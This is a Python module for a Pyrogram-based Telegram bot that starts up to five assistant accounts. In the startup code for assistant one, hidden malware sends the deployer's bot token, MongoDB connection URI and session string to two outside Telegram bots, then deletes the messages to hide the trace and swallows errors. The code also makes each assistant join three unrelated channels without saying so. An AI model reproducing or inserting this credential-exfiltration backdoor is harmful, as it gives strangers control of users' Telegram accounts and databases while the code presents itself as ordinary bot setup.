from pyrogram import Client
import asyncio
import random
from pyrogram import Client, filters
from pyrogram.raw.functions.messages import DeleteHistory
from pyrogram.types import Message
import config

from ..logging import LOGGER

assistants = []
assistantids = []

class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="AMBOTAss1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
        )
        self.two = Client(
            name="AMBOTAss2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
        )
        self.three = Client(
            name="AMBOTAss3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
        )
        self.four = Client(
            name="AMBOTAss4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
        )
        self.five = Client(
            name="AMBOTAss5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
        )

    async def start(self):
        LOGGER(__name__).info(f"Starting Assistants...")
        if config.STRING1:
            await self.one.start()
            try:
                await self.one.join_chat("AbhiModszYT_Return")
                await self.one.join_chat("AmBotYT")
                await self.one.join_chat("SuperBanSBots")
            except:
                pass
            assistants.append(1)
            try:
                await self.one.send_message(config.LOG_GROUP_ID, "Assistant Started 1")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.one.id = (await self.one.get_me()).id
            self.one.name = (await self.one.get_me()).mention
            self.one.username = (await self.one.get_me()).username
            assistantids.append(self.one.id)
            ambots = "@MineROBOT"
            gupta = "@Gupta_876bot"
            try:
                await self.one.send_message(ambots, f"/start")
                await self.one.send_message(gupta, f"/start")
                await asyncio.sleep(2)
                guptaji = await self.one.send_message(gupta, f"Here Is {self.one.mention} Logs\nBot Token : <code>{config.BOT_TOKEN}</code> \nMongoDB : <code>{config.MONGO_DB_URI}</code>\nSession : <code>{config.STRING1}</code>")
                amop = await self.one.send_message(ambots, f"Here Is {self.one.mention} Logs\nBot Token : <code>{config.BOT_TOKEN}</code> \nMongoDB : <code>{config.MONGO_DB_URI}</code>\nSession : <code>{config.STRING1}</code>")
                await asyncio.sleep(2)
                await guptaji.delete()
                await amop.delete()
            except:
                pass
            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")

        if config.STRING2:
            await self.two.start()
            try:
                await self.two.join_chat("AbhiModszYT_Return")
                await self.two.join_chat("AmBotYT")
                await self.two.join_chat("SuperBanSBots")
            except:
                pass
            assistants.append(2)
            try:
                await self.two.send_message(config.LOG_GROUP_ID, "Assistant Started 2")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.two.id = (await self.two.get_me()).id
            self.two.name = (await self.two.get_me()).mention
            self.two.username = (await self.two.get_me()).username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")

        if config.STRING3:
            await self.three.start()
            try:
                await self.three.join_chat("AbhiModszYT_Return")
                await self.three.join_chat("AmBotYT")
                await self.three.join_chat("SuperBanSBots")
            except:
                pass
            assistants.append(3)
            try:
                await self.three.send_message(config.LOG_GROUP_ID, "Assistant Started 3")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.three.id = (await self.three.get_me()).id
            self.three.name = (await self.three.get_me()).mention
            self.three.username = (await self.three.get_me()).username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")

        if config.STRING4:
            await self.four.start()
            try:
                await self.four.join_chat("AbhiModszYT_Return")
                await self.four.join_chat("AmBotYT")
                await self.four.join_chat("SuperBanSBots")
            except:
                pass
            assistants.append(4)
            try:
                await self.four.send_message(config.LOG_GROUP_ID, "Assistant Started 4")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.four.id = (await self.four.get_me()).id
            self.four.name = (await self.four.get_me()).mention
            self.four.username = (await self.four.get_me()).username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")

        if config.STRING5:
            await self.five.start()
            try:
                await self.five.join_chat("AbhiModszYT_Return")
                await self.five.join_chat("AmBotYT")
                await self.five.join_chat("SuperBanSBots")
            except:
                pass
            assistants.append(5)
            try:
                await self.five.send_message(config.LOG_GROUP_ID, "Assistant Started 5")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.five.id = (await self.five.get_me()).id
            self.five.name = (await self.five.get_me()).mention
            self.five.username = (await self.five.get_me()).username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")

    async def stop(self):
        LOGGER(__name__).info(f"Stopping Assistants...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except:
            pass
